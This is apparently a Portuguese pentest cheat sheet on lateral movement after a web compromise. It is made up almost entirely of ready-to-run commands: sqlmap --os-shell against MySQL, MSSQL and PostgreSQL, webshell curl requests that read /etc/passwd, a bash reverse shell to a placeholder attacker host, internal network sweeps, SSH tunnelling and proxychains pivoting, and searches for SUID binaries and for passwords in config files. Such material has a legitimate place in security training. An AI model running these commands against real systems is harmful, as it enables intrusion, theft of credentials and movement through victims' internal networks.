# Movimento Lateral

## Do Banco de Dados para o Sistema

```bash
# MySQL → OS Shell via UDF
sqlmap -u "http://alvo.com/?id=1" --os-shell --batch

# MSSQL → OS Shell via xp_cmdshell
sqlmap -u "http://alvo.com/?id=1" --dbms=mssql --os-shell --batch

# PostgreSQL → OS Shell
sqlmap -u "http://alvo.com/?id=1" --dbms=postgresql --os-shell --batch
```

## Via Webshell

```bash
# Após escrever webshell (via LFI ou SQLi)
curl "http://alvo.com/shell.php?cmd=id"
curl "http://alvo.com/shell.php?cmd=hostname"
curl "http://alvo.com/shell.php?cmd=cat+/etc/passwd"

# Reverse shell via webshell
curl "http://alvo.com/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATACANTE/4444+0>%261"
```

## Descoberta de Rede Interna

```bash
# Via OS Shell (após comprometer o servidor)
# Enumeração de rede
ifconfig / ip addr
netstat -an
ss -tuln
cat /etc/hosts
arp -a

# Varredura de rede interna
# Com ping
for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip &>/dev/null && echo "192.168.1.$ip up"; done

# Com nc (netcat)
nc -zv 192.168.1.1 22 80 443 3306 5432 2>&1 | grep open
```

## Pivoting

```bash
# SSH Port Forwarding (após obter credenciais SSH)
ssh -L 8080:192.168.1.100:80 usuario@alvo.com
# Agora http://localhost:8080/ acessa http://192.168.1.100:80 via servidor comprometido

# Túnel SOCKS (proxy para rede interna)
ssh -D 1080 usuario@alvo.com
# Configurar proxychains
proxychains sqlmap -u "http://192.168.1.100/?id=1" --batch
```

## Escalar de Web para Admin do Sistema

```bash
# Verificar sudo
sudo -l

# Verificar SUID
find / -perm -4000 2>/dev/null | head -20

# Verificar crontabs
cat /etc/crontab
ls -la /etc/cron.*

# Verificar serviços rodando como root
ps aux | grep root

# Procurar por senhas em arquivos de config
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
```

## Credenciais em Memória (MySQL em execução)

```bash
# Via /proc/[PID]/mem (root necessário geralmente)
# Mais simples: usar as credenciais já extraídas via SQLi
mysql -u root -p -h 127.0.0.1
```
